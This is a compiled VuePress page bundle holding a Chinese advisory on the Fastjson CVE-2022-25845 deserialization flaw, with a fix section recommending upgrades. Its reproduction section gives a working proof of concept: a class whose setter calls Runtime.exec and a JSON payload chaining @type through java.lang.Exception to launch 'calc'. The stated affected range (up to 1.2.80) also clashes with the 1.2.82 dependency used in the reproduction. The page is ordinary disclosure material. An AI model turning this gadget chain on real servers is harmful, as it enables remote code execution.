import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as l,c as d,a as e,b as a,d as i,e as r}from"./app-58e4a7d6.js";const o={},c=r(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列 化到 JavaBean。在 Fastjson 1.2.80 及以下版本中存在反序列化漏洞，攻击者可 以在特定依赖下利用此漏洞绕过默认 autoType 关闭限制，从而反序列化有安全风险的类。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Fastjson ≤ 1.2.80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用 idea 创建 maven 项目 搭建漏洞环境，在 pom 文件中添加</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
    &lt;version&gt;1.2.82&lt;/version&gt;
&lt;/dependency&gt; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建文件夹 com.example.fastjson，在下面添加两个 java 文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package com.example.fastjson;
 
import java.io.IOException;
 
public class Poc extends Exception {
    public void setName(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
package com.example.fastjson;
import com.alibaba.fastjson.JSON;
 
public class PocDemo {
    public static void main(String[] args) {
        String json = &quot;{\\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\&quot;@type\\&quot;:\\&quot;com.example.fastjson.Poc\\&quot;,\\&quot;name\\&quot;:\\&quot;calc\\&quot;}&quot;;
        JSON.parse(json);
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行 PocDemo</p><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,11),u={href:"https://github.com/alibaba/fastjson/releases/tag/1.2.83",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/alibaba/fastjson2/releases",target:"_blank",rel:"noopener noreferrer"};function m(b,p){const n=t("ExternalLinkIcon");return l(),d("div",null,[c,e("ol",null,[e("li",null,[a("升级至版本 FastJson 1.2.83："),e("a",u,[a("https://github.com/alibaba/fastjson/releases/tag/1.2.83"),i(n)])]),e("li",null,[a("升级到 FastJosn v2："),e("a",v,[a("https://github.com/alibaba/fastjson2/releases"),i(n)])])])])}const x=s(o,[["render",m],["__file","Fastjson 远程代码执行漏洞 CVE-2022-25845.html.vue"]]);export{x as default};
